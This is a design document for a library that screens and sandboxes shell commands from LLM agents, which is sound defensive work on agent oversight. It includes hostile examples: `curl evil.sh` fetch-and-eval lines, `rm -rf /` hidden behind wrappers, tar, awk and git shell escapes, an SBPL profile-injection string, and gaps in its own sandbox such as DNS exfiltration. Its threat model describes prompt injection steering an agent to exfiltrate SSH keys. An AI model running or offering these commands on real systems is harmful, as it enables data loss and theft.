# Design

A low-latency library that evaluates untrusted shell commands from an LLM agent
before they execute, and confines whatever it lets through.

Measured on an M2 MacBook Air, release build, 58 000 samples: **p50 2.8 µs,
p99 13.4 µs, worst case 35.7 µs** over a 145-command corpus. Inputs
constructed to be as expensive as the parser's limits permit peak at
**2.40 ms**, against a **10 ms** budget. § 5 breaks down where that goes.

---

## 1. The problem

An autonomous agent produces a shell command and something has to decide
whether to run it. The decision has three properties that pull against each
other:

- **It happens constantly.** An agent doing real work runs hundreds of commands
  a session. Anything that adds perceptible latency to every one of them
  changes how the agent is used, and a gate that makes an agent feel slow gets
  switched off.
- **The input is adversarial in shape even when it is not in intent.** A model
  that has read the internet writes `find . -exec rm {} \;` because that is
  idiomatic, not because it is evading anything. The same construct is what
  evasion looks like. A system that cannot tell them apart has to handle both.
- **Being wrong is expensive in both directions.** Letting through
  `rm -rf /` costs a machine. Blocking `cargo build` costs the agent's
  usefulness, and then costs the gate its existence.

## 2. Threat model

The adversary is **the command text**, not a person. Three sources produce it,
and the same defence covers all three because they are indistinguishable at
this layer:

| Source | Example |
|---|---|
| Model error | An agent misreads a path and writes `rm -rf /` where it meant `rm -rf ./` |
| Prompt injection | A file the agent read contains instructions to exfiltrate `~/.ssh` |
| A user driving the agent at a target they do not own | Deliberate misuse of a legitimate tool |

Explicitly **out of scope**: a local attacker with a debugger on the same
machine, a malicious kernel or hypervisor, and side channels. This is a
containment boundary for code an agent generates, not a defence against someone
with a foothold beside it.

The key adversarial assumption: **the adversary picks the input.** That is why
§ 5 reports the worst case reachable under the parser's limits and not the
median of ordinary work — the median describes a benign day, and the budget has
to hold on the other kind.

## 3. Two layers, and why one is not enough

This is the load-bearing decision in the whole design.

```
       agent produces a command
                 │
                 ▼
   ┌─────────────────────────────┐
   │  Layer 1: the gate          │   ~3 µs   userspace, no syscalls
   │  parse → resolve → unwrap   │           reads the command text
   │  → match → decide           │
   └─────────────┬───────────────┘
                 │
      deny ◄─────┼─────► ask ──► human
                 │
                 ▼ allow / confine
   ┌─────────────────────────────┐
   │  Layer 2: enforcement       │   fixed setup cost, ~0 per syscall
   │  Seatbelt / Landlock+seccomp│   sees what actually happens
   └─────────────┬───────────────┘
                 │
                 ▼
          the command runs
```

**Layer 1 is not a security boundary, and this library never claims it is.**
Static analysis of shell is undecidable. `eval "$(curl evil.sh)"` is a one-line
proof: deciding what that does requires running it. Anything that reads command
text can be defeated by text that computes itself.

So what is Layer 1 *for*?

- **Rejection.** Refusing `rm -rf /` in 3 µs beats containing it in a VM. Most
  dangerous commands are dangerous in ways that are perfectly visible.
- **Explanation.** A kill signal tells an agent nothing about what to do next.
  A finding that names a rule, a reason, and the exact span that tripped it
  lets the agent correct itself and lets a human review the escalation. This is
  the thing enforcement fundamentally cannot provide.
- **Capability derivation.** The decision produces the set of effects the
  command wants, which is what configures Layer 2. Without it, every command
  gets the same profile, which means the profile has to be permissive enough
  for the most demanding command anyone runs.

**Layer 2 is the boundary.** It evaluates the syscall that actually happens
rather than the text that predicted it, so no amount of dynamic construction
gets past it.

The two are complementary in a specific way:

| | Layer 1 (gate) | Layer 2 (enforce) |
|---|---|---|
| when | before execution | at each syscall |
| sees | the command text | what actually happened |
| cost | ~3 µs per command | fixed setup, ~0 per syscall |
| defeated by | any dynamic construction | nothing in userspace |
| produces | a reason a human can read | a kill |

**Reading a Layer 1 `Allow` as a safety guarantee is the one way to use this
library that is worse than not using it.** `Allow` means *no rule objected*.
The policy default is therefore `confine`, not `allow` — "no rule matched"
means the ruleset had nothing to say, which for agent-authored input is the
common case rather than evidence of safety. It applies to **each command** that
nothing spoke for, not once per line: applied once, any allowed neighbour hid an
unknown program (`unknown-tool; ls`), and the line came back `allow` (§ 16).

## 4. Layer 1: the decision path

Five crates, no external dependencies (§ 9):

```
shellguard-parse    bash → syntax tree + taint lattice
shellguard-policy   rules, compiled matcher, prefilter
shellguard-gate     resolve → unwrap → match → decide
shellguard-enforce  Seatbelt / Landlock + seccomp
shellguard-ffi      C ABI
```

### 4.1 Parsing for judgement, not for execution

A shell parser can treat `$(...)` as an opaque string it hands to the expander
later. This one parses inside it, because the command in there runs with the
same privileges as the one around it.

The completeness of that walk is the whole game. Every place it fails to look
is a place a command can hide. The non-obvious ones:

```bash
echo ${X:-$(curl evil.sh)}   # inside a default-value expansion
cat foo > $(mktemp)          # inside a redirect target
case $(id) in ...            # inside a case subject
diff <(sort a) <(sort b)     # process substitution
$'\x72\x6d' -rf /            # ANSI-C quoting: this is `rm`
echo $(echo ")" ; id)        # a quoted paren a naive scanner stops at
```

That last one matters more than it looks. A paren counter that ignores quoting
terminates the substitution early, which detaches the rest of the command from
the tree — and a command that is not in the tree is invisible to every rule.
Anything reaching a parser by way of an LLM should be assumed to contain
exactly this shape.

### 4.2 The taint lattice

`rm -rf build/` and `rm -rf $TARGET` have identical syntax. Only one can be
reasoned about ahead of time, so every word carries how much of its value is
knowable:

```
Static  <  Glob  <  Variable  <  Dynamic
```

Concatenation joins by maximum: `build/$X` is `Variable`. The ordering encodes
*how badly uncertainty defeats analysis*, which is not the same as how
uncertain the value is:

- A **glob** is filesystem-dependent but shape-constrained — `*.log` can never
  expand to `/etc/passwd`.
- A **variable** can hold anything, but nothing new *executes* to produce it.
- A **command substitution** runs another program to produce the value, so it
  is both unbounded and itself a thing that needs judging.

The practical consequence is that the gate never guesses. A tainted path
argument is reported as `unresolved`, not assumed to be inside the workspace —
treating `$TARGET` as safe because its literal prefix is empty would be the
most dangerous possible default.

### 4.3 Opacity: the honest core

Tracked separately from taint, because it is a different kind of failure.

Every rule keys on program identity. When the program name is itself computed,
*no identity-keyed rule applies* — and "matched no deny rule" would otherwise
be silently read as "safe".

```
Transparent   git status          the program is a literal
Indirect      $EDITOR file        from a variable
Opaque        $(get_cmd) -rf /    computed by running something else
```

`Opaque` is denied outright. `Indirect` escalates rather than denying, because
`$EDITOR file` and `$PYTHON script.py` are ordinary and a gate that refuses
them is a gate nobody keeps. This calibration difference — same
unjudgeability, different verdicts, because one shape is common in honest work
and the other is not — recurs throughout the ruleset.

### 4.4 Wrapper unwrapping

Because every rule keys on program identity, the cheapest bypass is to not be
the program:

```bash
sudo rm -rf /            # a sudo command
timeout 5 rm -rf /       # a timeout command
find . -exec rm {} \;    # a find command
xargs rm                 # an xargs command
bash -c 'rm -rf /'       # a bash command
```

None match a rule about `rm`. All delete the same files.

The answer is not to add `sudo`, `timeout`, `find` and `xargs` to every `rm`
rule — that multiplies out and still loses to the combination nobody
enumerated. It is to recover the inner command and judge *that*, so one rule
about `rm` covers `sudo env timeout 5 nice -n 10 rm -rf /` without anyone
having written that down.

Unwrapping handles `sudo`, `doas`, `env`, `nohup`, `setsid`, `nice`, `ionice`,
`stdbuf`, `timeout`, `taskset`, `watch`, `strace`, `xargs`, `command`,
`find -exec`/`-execdir`/`-ok`, and literal `sh -c` payloads (which are parsed
recursively). It is bounded by depth, and hitting the bound is *reported* —
`Incomplete::UnwrapDepth` — rather than silently producing a clean verdict.

A related class is options whose *values* are commands, where the program is on
nobody's dangerous list:

```bash
tar --checkpoint-action=exec=/bin/sh
rsync --rsh-command=/bin/sh
awk 'BEGIN{system("rm -rf /")}'
git config core.pager '...'     # a delayed shell escape
```

These are rules rather than unwrapping, because the payload is not in argv
position.

### 4.5 The policy engine

Rules are matched against `CommandFacts` — a command already reduced to the
properties rules ask about. The policy layer never touches the filesystem or
the syntax tree, which is what makes the ruleset testable with a struct literal
instead of a fixture directory.

Compilation happens once at load:

- Rules naming a program go in a **hash bucket** keyed on the resolved
  basename, so `git status` never looks at a single `rm` rule.
- Rules applying to any program are narrowed by an **Aho-Corasick prefilter**
  over their literal needles, so a rule about `/etc/shadow` costs nothing on a
  command that does not mention it. One pass over the text, independent of how
  many needles exist — adding the 201st rule costs nothing at evaluation time.

The current ruleset is 48 rules, 55 prefilter patterns, and **4 rules that must
be evaluated on every command** (those whose predicates imply no literal, such
as "has a write redirection"). `shellguard rules` reports these, because a
ruleset quietly drifting towards unindexable is how a fast matcher becomes a
slow one.

Prefilter soundness has one subtlety: a negated predicate contributes **no**
needles. `not arg-eq safe` matches precisely when its needle is *absent*, so
indexing it would drop the rule from consideration exactly when it should fire.
Likewise a disjunction only prefilters if *every* branch contributes one.

### 4.6 Verdicts combine by severity, not by order

```
Allow  <  Confine  <  Ask  <  Deny
```

A command matching both an `allow` rule and a `deny` rule is denied. There is
no precedence to reason about and no way for an over-broad allow to accidentally
outrank a specific deny. A policy needing an exception carves it out with a
predicate on the deny rule, where it is visible in the rule that grants it.

## 5. The latency budget

Nothing on the decision path forks, execs, or opens a socket. The only syscalls
are the `stat` and `readlink` behind path resolution, cached on the (program,
directory) pairs an agent hits repeatedly — 99.9 % hit rate across the corpus.
What remains is parsing and matching, both linear in command length.

That is why the limit is a **deadline** rather than a timeout on a worker: no
step can block, so a check between phases bounds the whole thing, and there is
no thread to cancel.

There are two numbers and they are not the same. The **budget**, 10 ms
(`LATENCY_BUDGET`), is what this document promises and `shellguard bench` asserts.
The **deadline**, 100 ms (`DEFAULT_DEADLINE`), is where the gate stops and denies.
The deadline is a safety valve: it exists so adversarial input cannot make
evaluation slow enough to be a bypass, and the worst such input measured takes
about 2 ms. It sits at ten times the budget because it is wall-clock time and so
also counts every moment the thread was not scheduled. It used to equal the budget,
and on a busy machine it then fired on ordinary commands (§ 12).

Measured, release build, M2 MacBook Air, 58 000 samples over 145 commands:

| | full gate | parse only |
|---|---|---|
| p50 | 2.8 µs | 542 ns |
| p90 | 7.2 µs | 875 ns |
| p99 | 13.4 µs | 1.5 µs |
| p99.9 | 19.2 µs | 1.5 µs |
| max | 35.7 µs | 21.9 µs |

Roughly 20 % of the time is parsing; the rest is resolution, unwrapping and
matching. The slowest ordinary commands are the deep wrapper chains, which is
expected — each layer is a fresh command to normalise and match.

**Percentiles, not a mean.** A mean of 200 µs is consistent with one command in
a thousand taking 50 ms, and that one command is the one that matters because
an adversary picks the input. This is also why the harness is a hundred lines
of `Instant::now` rather than a statistics framework: Criterion is built to
detect small differences in a *mean* between revisions, and discards outliers
as noise. Here the outliers are the measurement.

### Adversarial inputs

Constructed to cost as much as possible while staying inside the parser's
limits. These are the numbers the budget actually rests on:

| input | bytes | max |
|---|---|---|
| 2 000-stage pipeline | 17 997 | **2.40 ms** |
| 9 000 arguments | 36 005 | 1.74 ms |
| 1 000 quote-confusing substitutions | 13 005 | 1.22 ms |
| 800 nested parameter defaults | 9 605 | 909 µs |
| depth-30 nesting, 4 KiB payload | 4 098 | 844 µs |
| 3 000 sibling substitutions | 18 005 | 504 µs |
| over the byte cap | 200 005 | **250 ns** |

Worst case **2.40 ms — 4× headroom** against the 10 ms budget. The last row is
the point of having a cap: oversized input is rejected on sight without
parsing.

Three limits bound the work, and each is checked before it can be exceeded
rather than after:

```rust
max_bytes: 64 KiB     max_depth: 32     max_nodes: 4096
```

The node budget is **shared across nesting**, so sibling substitutions cannot
multiply total work — that is what keeps "3 000 sibling substitutions" at
504 µs instead of quadratic.

Exceeding any limit is a `Deny`, not a best effort.

## 6. Layer 2: enforcement

| | macOS | Linux |
|---|---|---|
| filesystem scope | Seatbelt (SBPL) | Landlock ABI 1+ |
| syscall removal | — | seccomp-BPF |
| network scope | Seatbelt, coarse | Landlock ABI 4+ |
| entitlement required | none | none |
| **verified here** | **yes, against the kernel** | **no — compiles only** |

### 6.1 macOS: Seatbelt, and why not Endpoint Security

Endpoint Security is the framework that genuinely intercepts syscalls on macOS:
`ES_EVENT_TYPE_AUTH_EXEC`, `AUTH_OPEN`, `AUTH_UNLINK` block the operation until
a client responds. It also requires the
`com.apple.developer.endpoint-security.client` entitlement — granted by Apple
case by case — plus running as root with Full Disk Access. A library usable
only by organisations who have been through that process is not usable.

Seatbelt requires no entitlement, is enforced in the kernel through the MAC
framework, and costs nothing per syscall because the policy is evaluated in
kernel context rather than by a userspace supervisor.

Its drawback stated plainly: `sandbox_init` has been formally deprecated since
macOS 10.8 and SBPL is undocumented. The practical argument for depending on it
anyway is that it has backed Chrome's and Firefox's renderer sandboxes for over
a decade, so its removal would be noticed by considerably more people than us.

**Profile generation is a security boundary, not string formatting.** SBPL is
s-expression source compiled by the kernel, so an unescaped `"` in a workspace
path closes the string and the rest becomes policy — a directory named
`ws") (allow default) (deny nothing` would disable the sandbox from inside the
profile meant to configure it. Paths are escaped, control characters are
refused outright, and there is a test for exactly that attack.

One hard-won detail, now a comment in the source: a profile needs
`(literal "/")` or every process dies on `SIGABRT` during dyld startup with no
diagnostic. Granting `(subpath "/usr")` grants access to things *under* `/usr`
but not the lookup of `/` that reaching them goes through. The failure is
indistinguishable from a malformed profile.

**Mach services are an allowlist, and it was measured rather than guessed.** A Mach
service is a daemon outside the sandbox that acts on a client's behalf, so
`(allow mach-lookup)` is a way out that has nothing to do with files or sockets:
LaunchServices opens URLs and applications, `SecurityServer` fronts the keychain,
`pasteboard.1` is the clipboard, `nsurlsessiond` fetches URLs. All four were
reachable from the old profile. Denying LaunchServices alone had broken `git`,
`python3`, `perl` and `curl`, so the answer had to be "what do tools need", found
this way: run 46 common tools under an empty allowlist, read the sandbox's own
denial log for what each failing tool was refused, add it, repeat until every tool
behaves as it did under the blanket allow, then drop each entry in turn and keep
only those whose removal breaks something.

| grant | services | why |
|---|---|---|
| always | `opendirectoryd.libinfo` | `getpwuid`/`getgrgid`: `id -un`, `ls -l`'s owner column, `stat -f %Su`, Python's `pwd` and `getpass` |
| with network | `TrustEvaluationAgent` | certificate-chain evaluation: without it an HTTPS handshake completes and then fails verification |

That is the whole list (`MACH_SERVICES_BASE` and `MACH_SERVICES_NETWORK` in
`macos.rs`). Two things about it are worth knowing before it surprises someone.

*An empty list is not a strict profile.* In SBPL an `(allow mach-lookup` with no
filter is the blanket allow: measured, `SecurityServer` is reachable through it. A
generator that writes the block unconditionally turns an empty allowlist into the
thing it replaced, so `mach_rule` emits nothing for an empty list, and a test pins
that. It was found because a mutation that emptied the list passed the real-tool
test.

*The list is per macOS release.* Apple moves which daemon answers which question,
and the battery ran on one version. A tool that works unsandboxed and fails here
has almost certainly been refused a service, and the kernel says which:

```sh
log show --last 5m --predicate 'eventMessage CONTAINS "deny(1) mach-lookup"'
```

Whether to grant what it names is a decision about what a sandboxed command may make
the system do for it, not a compatibility patch. A test fails if any of the four
above is ever added.

### 6.2 Linux: Landlock for paths, seccomp for capabilities

Neither alone is sufficient, and the reason is worth being precise about.

**seccomp cannot express a path.** By the time `openat` is dispatched the
filename is a userspace pointer, and dereferencing it in a filter is unsound —
another thread can rewrite the buffer between the check and the kernel's own
copy. That is a time-of-check race whose timing the attacker controls.

**Landlock evaluates in the LSM hooks**, after the kernel has resolved the
path and against the resolved result. No window to race, and symlinks and bind
mounts are already accounted for. It also costs nothing per syscall: the check
walks an already-cached dentry chain rather than round-tripping to userspace.

What seccomp *is* good for is removing whole capabilities. No confined command
needs to load a kernel module, trace another process, or re-enter a namespace,
and a syscall that cannot be made has no exploitable behaviour.

The denylist covers `ptrace`, `process_vm_*`, mount and namespace operations,
module loading, `kexec`, `bpf`, `perf_event_open`, the keyring calls,
credential changes, `personality`, `userfaultfd`, the file-handle calls, and
**io_uring**.

That last one is the entry whose absence would make the rest decorative.
io_uring services reads, writes and opens through a shared memory ring that the
kernel processes without those operations passing through the syscall dispatch
path seccomp inspects. **A seccomp policy that blocks `openat` but permits
`io_uring_setup` does not block opening files.**

`clone3` is also refused, because it passes its flags in a struct rather than a
register, so seccomp cannot inspect them — refusing it forces the classic
`clone`, whose flags are visible.

**ABI negotiation is not optional.** Each Landlock release adds access bits, and
passing a bit the running kernel does not know returns `EINVAL` — the ruleset is
never created and a binary built against newer headers *silently confines
nothing*. The version is queried first, requested rights are masked to it, and
the negotiated version is returned to the caller so "this kernel cannot restrict
network" is a visible state rather than an assumption. Notably, ABI 1 and 2
cannot see truncation at all, which means `> file` can empty a file whose write
access was denied.

### 6.3 What neither layer gives you

macOS has **no unprivileged equivalent of seccomp**. Linux confinement here is
strictly stronger. A deployment wanting Linux-grade isolation on a Mac should
run commands in a Linux VM through Virtualization.framework rather than trust
Seatbelt to be equivalent — and should amortise the ~1–2 s boot with a warm
pool, because per-command VM startup is 100× the entire gate budget.

## 7. Rollback: checkpoint and restore

**Built and verified.** An earlier draft of this document said `git stash` was
the wrong primitive because it mutates the working tree. That is true of
`git stash push` and **false of `git stash create`**, which was measured
rather than assumed:

```
$ git status --porcelain      # before
 D deleteme.txt
 M tracked.txt
?? untracked.txt
$ git stash create
b58a0f063c19a51662f3ef3ccd49fd69b5a7fa2d
$ git status --porcelain      # after — identical
```

`create` writes a commit object recording the worktree and index, prints its
SHA, and touches nothing: not the worktree, not the index, not `refs/stash`. It
does not race a command that is still running. It is exactly the right
primitive.

It also **does not capture untracked files** — `untracked.txt` is absent from
the resulting tree — and that gap is the whole reason the state manager is more
than three lines. An agent that *creates* a file and gets rolled back merely
leaves it behind. An agent that *deletes* an untracked file loses it forever,
because nothing ever recorded its contents. So untracked, non-ignored files are
hashed into the object database separately with `git hash-object -w` and
restored by hand.

A checkpoint is therefore `{HEAD, stash commit, untracked blobs, protected
digests}`. Restoring moves `HEAD` back with `reset --soft` first — leaving the
index and worktree alone — then `read-tree -u --reset` restores tracked files,
then untracked files are written back from the object database.

### What it deliberately does not cover

Files outside the workspace, and files inside it that `.gitignore` excludes:
`node_modules`, build output, `.env`. Capturing an ignored tree can mean copying
gigabytes, and the workspace is the only thing the gate lets a command write
anyway. Protected files close the gap for the specific paths that matter, by
SHA-256 digest rather than by content — cryptographic, because a
non-cryptographic hash would let a command modify a file and pad it back to the
same checksum, which defeats the only thing the check is for.

On Linux an overlayfs upper layer is the complete answer and cheaper than all of
this. It is **not implemented**; the git path works on both platforms and was
the higher-value half.

### Rollback is itself destructive

It overwrites files and can delete them. Every path it touches is checked to
resolve inside the canonicalised workspace, resolving the deepest *existing*
ancestor rather than normalising textually — a command can create
`link -> /tmp/elsewhere` inside the workspace, and a restore that followed it
would turn rollback into the exploit. Deleting untracked files that appeared
after the checkpoint is opt-in: undoing a failed command is one thing, deleting
a file the agent created is another, and that file may be the only record of
what it was attempting.

## 8. Where commands run

Four runtimes behind one interface, so the choice is a deployment decision
rather than a code change:

| runtime | isolation | start | verified here |
|---|---|---|---|
| local (Seatbelt / Landlock+seccomp) | kernel sandbox | ~1–3 ms | **yes, against the kernel** |
| gVisor | user-space kernel | ~50–150 ms | config only, no Linux host |
| Firecracker | hardware VM | ~125 ms cold | config only, no Linux host |
| Virtualization.framework | hardware VM | ~0.5–1.5 s cold | config validated, no guest kernel |

The local runtime is the default and for most commands it should be. Isolation
is a kernel sandbox rather than a VM, so a kernel bug is a full escape — but it
starts in milliseconds, and paired with a checkpoint it makes the common failure
(a command that damages the workspace) both contained and undoable. Reserving a
VM for commands that warrant one is what keeps the system usable.

### The 200 ms target

**A cold VM boot cannot meet it.** Firecracker's well-known ~125 ms is a
stripped kernel on KVM counting kernel boot alone; Virtualization.framework
carries more overhead and takes closer to a second for a minimal Linux guest.
Any design that boots per command has already lost by a factor of five to fifty.

So the boot moves off the critical path. Slots are booted ahead of demand and
parked; acquiring one is popping a queue. The target becomes an *acquisition*
SLA, which is achievable and is the honest thing to measure. `PoolStats` counts
warm hits and cold boots separately, so a pool that is quietly too small shows
up as cold boots rather than as an unexplained latency tail.

This is what production sandboxes do. It is not a way around the requirement; it
is the requirement's only real implementation.

### On gVisor and "Landlock inside the container"

seccomp survives into the container: the OCI spec carries a seccomp profile and
`runsc` applies it, generated from the same denylist the BPF filter uses so the
two cannot drift.

Landlock does not. gVisor implements the Linux syscall surface itself and does
not implement `landlock_create_ruleset`; a ruleset built inside would fail at
creation, and code that ignored that failure would believe it was confined when
it was not. The filesystem scoping comes from the OCI mount set instead —
read-only root, `/proc` and `/sys` masked, and only the host paths the profile
grants, each mounted `ro` or `rw` to match. A different mechanism aiming at the
same effect. Calling it Landlock would misdescribe the threat model.

**"The same effect" was asserted in this paragraph and checked nowhere, and it
was false.** The mount set used to bind the workspace `rw` unconditionally, so a
profile that granted no writes — `ls`, `git status`, anything the gate allowed
on `fs.read` alone — got a *writable* workspace under gVisor while Seatbelt and
Landlock made it read-only. A test named "only the workspace is writable" sat
over it and asserted only that there was one bind mount, never `ro` versus `rw`.
The extra `read_paths` and `write_paths` a profile can carry were ignored
altogether, and `/tmp` was a writable tmpfs even when the profile had no scratch
directory.

**One list, three translations.** `Profile::fs_grants` is now the single place
that answers "which host paths does this profile expose, and how far".
Seatbelt, Landlock and the gVisor mount set each translate that list into their
own mechanism and derive nothing themselves, so they can differ in *how* they
enforce but not in *what*. The gVisor test suite (`tests::parity_*`) holds the
translation to the list across every capability alone and combined, with and
without a scratch directory, and for hand-built profiles with extra and nested
paths: the container writes exactly the paths granted writes, reads exactly the
paths granted reads, mounts nothing that was not granted, and never mounts the
host's own `/usr` or `/etc`.

Where the backends deliberately differ: Landlock reads the host's `/usr` and
`/etc` directly, while a container's system files are the bundle's own root
filesystem and the host's are never mounted. The private scratch directory is a
tmpfs private to the container rather than a host directory — present only when
the profile has one, since a profile without one has nowhere writable for temp
files under the other two backends either. If two grants land on one guest path
(possible only for a hand-built profile), the *lower* access wins.

## 9. Failing closed

Every failure path denies. This is the property that makes the budget safe
rather than merely usually fast.

| condition | verdict |
|---|---|
| command does not parse | `Deny` + `Incomplete::Parse` |
| over a resource limit | `Deny` |
| deadline expired | `Deny` + `Incomplete::Deadline` |
| wrapper chain too deep | `Deny` + `Incomplete::UnwrapDepth` |
| recovered `sh -c` payload does not parse | `Deny` |
| command is not valid UTF-8 (FFI) | `Deny` |
| `NULL` decision pointer (FFI) | reads as `Deny` |
| a command no rule matched | policy default (`Confine`), applied per command |

Input that a shell would accept and this parser rejects is precisely the
interesting case, and not the one to be lenient about. Without the deadline
denying, the bypass would be "make evaluation slow" — arrangeable by an agent
emitting adversarial input, and leaving no trace beyond a latency blip.

## 10. Zero dependencies

Every crate has no external dependencies. About 10 400 lines of Rust, including
a hand-written bash parser, an Aho-Corasick implementation, a policy-file
parser and a JSON serialiser.

That is a deliberate constraint, not an accident of scope. This library is a
security boundary running on the critical path of an autonomous agent. A
transitive dependency tree is an unaudited code-execution surface **inside the
thing whose entire job is to stop unaudited code execution** — and the supply
chain is a live attack path against exactly this kind of software.

The trade is real and worth naming: a hand-written bash parser will have bugs a
mature one would not. It is mitigated by the corpus (§ 10), by resource limits
that bound the blast radius of a parser bug to a wrong verdict rather than a
crash, and by memory safety, which is why Rust rather than C for code parsing
adversarial input.

## 11. The corpus is the specification

145 commands with expected verdicts in `tests/corpus.txt`, kept **separate from
the ruleset that implements them**. When a policy edit moves an entry, someone
has to decide whether that is a fix or a regression — the decision that gets
skipped when the only record of intent is the rules themselves. It runs under
`cargo test`, not only under a tool someone has to remember.

Writing it down immediately found four real bugs, which is the argument for
doing it:

- `sed` and `awk` sat in the blanket read-only allow list. `sed -i` rewrites in
  place; `awk '{print > "/etc/x"}'` writes a file argv never names as a path.
- `device.format` named `mkfs`, but program matching is on the exact basename —
  it missed `mkfs.ext4` and every other real invocation.
- `destructive.truncate-outside` denied `>> ~/.zshrc` under a reason that said
  "truncates". Appending destroys nothing.
- `vcs.force-push` denied. Force-pushing a feature branch is routine and the
  rule cannot tell it from force-pushing `main`.

A second test asserts the corpus keeps at least ten cases of *each* verdict. A
corpus that drifts into being all-deny stops testing calibration, which is most
of what a ruleset gets wrong.

## 12. Known limitations

**The gate is not a boundary.** Stated in § 3 and repeated because it is the
thing most likely to be forgotten. `Allow` means no rule objected.

**Only the local runtime has ever executed anything.** It is verified against
the real kernel: a write outside the workspace and a read of `/etc/passwd` are
both blocked while work inside succeeds. The other three are configuration and
availability detection only —

- **Firecracker and gVisor**: no Linux host in this development environment.
  Config generation is tested against the documented schemas; `execute()`
  returns `Unavailable` with that reason rather than pretending.
- **Virtualization.framework**: the Swift helper is real and its configuration
  path is verified *against the framework* — it rejects a memory size below the
  platform minimum and a missing kernel, and reports hardware support. Booting
  needs a guest kernel image this repository does not ship and an in-guest
  agent. The wire protocol that agent must speak is specified in
  `vz::GUEST_PROTOCOL`, so what is missing is an image, not an interface.

**The warm pool is not wired to a VM backend.** It is implemented and tested
against a synthetic slow-booting backend, which exercises the acquisition SLA,
refill, reuse and retirement. Connecting it to `VzRuntime` needs a
persistent-helper mode in the Swift side, which cannot be tested without a
guest.

**overlayfs rollback is not implemented** (§ 7).

**The audit log is not tamper-evident, and sees only what goes through the
engine** (§ 14). It keeps the *sandboxed command* out — verified at both the
gate and the kernel — but there is no hash chain or signature, so a process
running as the same user outside the sandbox can rewrite it. It also cannot
record a command that was run some other way, which is why every file's header
says so.

**The deadline used to fire on scheduling noise.** The gate denies when it exceeds
its deadline — by design, and correct for adversarial input — and the deadline used
to be 10 ms of wall-clock time. That also counts every moment the thread was not
scheduled, so on a busy or cold machine a benign command was occasionally refused.
Measured: 1 of 414 identical evaluations of `basename $(pwd)` returned `deny` with
`evaluation exceeded its 10ms budget after 30.49ms`, and was `confine` the other
five times. This is very probably what the two earlier "benign command came back
without having run" test failures were (consistent with them, not proven for them).

The default is now **100 ms**, separate from the 10 ms latency budget (§ 5). The
justification is that one measurement: a 30 ms overrun refused by the old limit is
comfortably inside the new one, and the worst adversarial input takes about 2 ms,
so the valve still catches what it is for. It is *not* demonstrated under load: a
16-way CPU-saturation run did not trigger the old limit either (0 of 276), because
fair scheduling favours short-lived processes — the stall was seen only when the
machine was thrashing at a load average of 176. A wall-clock limit of any length can
still be exceeded by a long enough stall, and when it is the answer is still `deny`.

**On Linux, "no network" means "no TCP".** Read from the code; there is no Linux
host here to run it. Landlock's network rules (ABI 4–6) cover TCP `bind` and
`connect` only. They do not cover UDP or Unix-domain sockets, and the seccomp
filter denies neither `socket` nor `sendto`. So a command with no network grant can
still send UDP datagrams — DNS exfiltration needs nothing more — and connect to
Unix sockets. macOS is different: Seatbelt refuses all of it (§ 16). The Linux
runtime is therefore weaker than the macOS one on exactly the property that
matters most for exfiltration, and gVisor (which unshares the network namespace) is
the stronger Linux option. `sandboxed_commands_without_a_network_grant_reach_no_listener`
exists for Linux and is `#[ignore]`d with this reason.

**macOS Mach services are an allowlist now (§ 6.1), with three caveats.** The four
services that act on the user's behalf — LaunchServices, `SecurityServer`, the
pasteboard, `nsurlsessiond` — are refused, in the offline profile *and* in the
network-granted one, and tests ask the kernel (`bootstrap_look_up`) rather than
reading the SBPL. The caveats: the list is what 46 common tools needed on one macOS
release, so an unlisted tool or another release can fail with a refusal that says
nothing about sandboxing (the `log show` command in § 6.1 names it); a network-granted
command will not discover a proxy set in System Settings, because
`SystemConfiguration.configd` is not granted (the tools tried ran without it, and it
exposes interface, DNS and Wi-Fi details — `HTTPS_PROXY` still works); and "not
reachable" is the property claimed, not "not exploitable", which was never tested
because doing so means opening URLs and reading a clipboard and keychain on a real
machine.

**"Read-only" git rules that mutate — fixed for `branch`, `tag` and `--output`.**
`safe.vcs-inspection` allowed `git branch` and `git tag` whatever their arguments,
so `git branch -D main` and `git tag -d v1` were `allow` — "run directly", with no
sandbox in a harness that uses the gate alone. Fixing `remote` (§ 16) had shown the
shape of the problem: a subcommand that lists and mutates with the same word.

*The fix is an allowlist, not a longer blocklist.* Two predicates were added to the
policy language: `no-positional` (nothing given but flags) and `flags-within` (every
flag is one of these). `branch` and `tag` each get a listing rule that allows a command
only if all its flags list or format, and treats a bare name as a pattern only when
`--list` is present; force and delete flags get `ask` rules, consistent with
`reset --hard` and `clean -f`. An allowlist matters here for a reason found by
running git rather than reading its manual: **git accepts unambiguous abbreviations
of long options**, so `git branch --del x` and even `--d x` delete, and
`git tag --d v1` too. A list of the words that delete is a list of the ones someone
thought of. `flags-within` matches exact names, so an abbreviation is simply not
allowed; the `ask` rules match the prefixes. An argument that begins with an
expansion (`$X`, `*`, `$(...)`) fails `flags-within` outright, because `X=-D` makes
`git branch --list $X` a deletion.

*It is checked against git.* `tests/git_refs.txt` holds 98 commands in five classes
(`readonly`, `conservative`, `mutates`, `destroys`, `inert`). Each is judged by the
gate and then run in a scratch repository whose branches and tags sit on different
commits, and the refs are compared before and after — so a `mutates` line that
changes nothing fails, and a "read-only" flag that isn't read-only in git fails.
Under the old rule 33 of the 98 lines got the wrong verdict.

*The cost is stated:* reads that give a commit as a separate word — `git branch
--merged main`, `--contains <sha>`, `--points-at`, `git tag -n5` — cannot be told from
creating a branch of that name, so they are `confine` (run in the sandbox), not
`allow`. They are the `conservative` lines, kept so the cost is countable. The
severity choice — `ask` for `-D`/`-M`/`-C`/`-f` and for any tag delete or move — is a
judgment, mirrored on `reset --hard`; it is one rule each in `default.policy`.

*A second hole of the same class turned up doing this:* `--output=<file>` on `git diff`,
`log`, `show` and `shortlog` writes (and overwrites) any path with no shell redirect
for the write rules to see, and was `allow`. It is now excluded from the read-only
rule; `git log --output=$HOME/.bashrc` is `confine`.

*git's global options hid the subcommand.* `git -C dir reset --hard` was read as
the subcommand `dir`, because the subcommand was "the first word that is not a
flag" and `-C` takes the next word as its value. Every git rule keyed on a
subcommand looked past it: `reset --hard`, `clean -fdx`, `push --force`, `branch -D`,
`rebase -i`, `config core.pager` all fell to `confine` behind `-C`, `-c` or
`--work-tree`. The gate now knows which global options take a value (git's, and the
package managers' `--prefix`/`--cwd`/`-C`), and a test holds the property that
putting any of them in front of any command in `git_refs.txt` never lowers its
verdict.

*And `-c` is a way to run a program.* `git -c core.pager='sh -c …' log` runs the
pager without writing any config, and `git -c alias.x='!cmd' x` runs a shell
command — both measured. An alias can also rename a destructive command so no rule
sees it: `git -c alias.x='reset --hard' x` resets. Inline config with a key that
names a program, or any alias, now asks, as `git config` with the same keys does.
